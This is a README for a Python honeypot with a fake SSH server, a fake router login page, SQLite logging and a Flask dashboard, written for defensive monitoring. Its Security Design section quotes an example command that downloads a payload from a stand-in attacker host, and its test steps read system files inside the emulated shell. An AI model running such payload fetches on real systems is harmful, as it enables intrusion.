# 🕵️ Honeypot

A multi-protocol cybersecurity honeypot designed to simulate vulnerable services, capture attacker behavior, store security events, and visualize activity through a live monitoring dashboard.

> ⚠️ **For authorized security research and defensive monitoring only.**

## ✨ Features

### 🔐 SSH Honeypot

- Paramiko-based fake SSH server
- Realistic Ubuntu 22.04 environment
- Interactive fake shell
- Emulated filesystem
- Captures authentication attempts
- Records usernames and passwords
- Logs attacker commands
- Detects download attempts
- Logs privilege-escalation attempts
- Simulates common Linux commands

### 🌐 HTTP Honeypot

- Fake router administration interface
- Captures HTTP requests
- Records request headers and bodies
- Captures submitted credentials
- Provides a realistic `robots.txt`
- Handles scanner and enumeration probes
- Logs web authentication attempts

### 📊 Live Dashboard

A Flask-based dashboard provides visibility into honeypot activity.

The dashboard displays:

- Total connections
- Unique attacker IPs
- Authentication attempts
- Captured credentials
- Commands executed
- Download attempts
- HTTP requests
- Recent attacker activity
- Attack activity over time

### 🗄️ Event Storage

All activity is stored locally using SQLite.

| Event | Description |
|---|---|
| `connection` | Connection to a honeypot service |
| `auth` | Authentication attempt |
| `login` | Accepted login |
| `pty_request` | SSH terminal request |
| `subsystem_request` | SFTP/SCP-style request |
| `command` | Command entered by attacker |
| `download` | Download attempt |
| `su_attempt` | Privilege escalation attempt |
| `shutdown_attempt` | Reboot/poweroff attempt |
| `http_request` | HTTP request and metadata |

---

## 🏗️ Architecture

~~~text
                         Internet / Tester
                                │
                    ┌───────────┴───────────┐
                    │       Honeypot        │
                    │                       │
              ┌─────▼─────┐           ┌─────▼─────┐
              │ SSH :2222 │           │ HTTP :8080│
              │ Honeypot  │           │ Honeypot  │
              └─────┬─────┘           └─────┬─────┘
                    │                       │
                    └───────────┬───────────┘
                                ▼
                         SQLite Event DB
                                │
                                ▼
                       Flask Dashboard
                           127.0.0.1:5000
~~~

---

## 📁 Project Structure

~~~text
honeypot/
├── config.py
├── dashboard/
│   ├── __init__.py
│   └── templates/
│       └── index.html
├── honeypot.py
├── http_pot.py
├── README.md
├── requirements.txt
├── scripts/
│   └── smoke_test.py
├── ssh_pot.py
└── storage.py
~~~

---

## 🚀 Installation

Clone the repository:

~~~bash
git clone https://github.com/fr6ey/honeypot.git
cd honeypot
~~~

Create a virtual environment:

~~~bash
python3 -m venv .venv
source .venv/bin/activate
~~~

Install dependencies:

~~~bash
pip install -r requirements.txt
~~~

Start the honeypot:

~~~bash
python honeypot.py
~~~

### Default Services

~~~text
SSH        0.0.0.0:2222
HTTP       0.0.0.0:8080
Dashboard  127.0.0.1:5000
~~~

---

## 🧪 Testing

### SSH

From another terminal:

~~~bash
ssh -p 2222 root@127.0.0.1
~~~

Try commands such as:

~~~bash
whoami
uname -a
ls -la
cat /etc/passwd
cat /var/log/auth.log
~~~

### HTTP

~~~bash
curl -i http://127.0.0.1:8080/
~~~

Probe `robots.txt`:

~~~bash
curl http://127.0.0.1:8080/robots.txt
~~~

Test the login endpoint:

~~~bash
curl -X POST \
  -d "username=admin&password=admin123" \
  http://127.0.0.1:8080/login
~~~

### Dashboard

Open:

~~~text
http://127.0.0.1:5000
~~~

Activity generated through the SSH and HTTP honeypots should appear in the dashboard.

---

## ✅ Automated Testing

Run:

~~~bash
python scripts/smoke_test.py
~~~

The test suite checks:

- SSH connectivity
- Interactive shell behavior
- Fake filesystem responses
- Command execution
- Download attempt logging
- HTTP responses
- HTTP login capture
- 404 handling
- Dashboard API
- Event collection

---

## ⚙️ Configuration

Configuration is available in:

~~~text
config.py
~~~

Default ports:

~~~python
SSH_PORT = 2222
HTTP_PORT = 8080

DASHBOARD_HOST = "127.0.0.1"
DASHBOARD_PORT = 5000
~~~

The honeypot also provides configurable fake system information such as:

- Hostname
- Operating system
- Kernel version
- Internal IP
- MAC address

The SSH host key is generated locally and reused between sessions.

---

## 🔒 Security Design

The honeypot is designed so attacker commands operate inside an **emulated environment** rather than directly executing on the host operating system.

Download commands such as:

~~~bash
wget http://attacker.example/payload.sh
~~~

are logged rather than actually downloading the payload.

The dashboard binds to:

~~~text
127.0.0.1
~~~

by default and should not be exposed to the public Internet.

---

## ⚠️ Deployment Warning

If deploying this honeypot to the Internet:

- Use a dedicated VPS or isolated VM.
- Do not run it on your primary workstation.
- Do not expose the dashboard publicly.
- Restrict outbound network access.
- Only monitor infrastructure you own or are authorized to monitor.
- Treat captured attacker data as potentially sensitive.
- Monitor disk usage and database growth.

---

## 🔬 Security Research Use Cases

This project can be used to study:

- SSH brute-force attacks
- Credential attacks
- Automated scanners
- Command execution patterns
- Reconnaissance
- Web enumeration
- Web login attacks
- Payload/download attempts
- Attacker command sequences
- IP-based attack patterns

---

## 🛠️ Technology Stack

- **Python 3**
- **Paramiko**
- **Flask**
- **SQLite**
- **HTTP Server**
- **HTML/CSS/JavaScript**

---

## 🗺️ Future Improvements

- GeoIP enrichment
- ASN/ISP information
- Telegram/Slack alerts
- JSON/JSONL event export
- ELK/Splunk integration
- Docker deployment
- Docker Compose isolation
- TLS-enabled HTTP honeypot
- Additional fake services
- More realistic Linux commands
- Automated attack classification
- Threat-intelligence enrichment

---

## 📜 License

This project is intended for educational, defensive-security, and authorized security-research purposes.
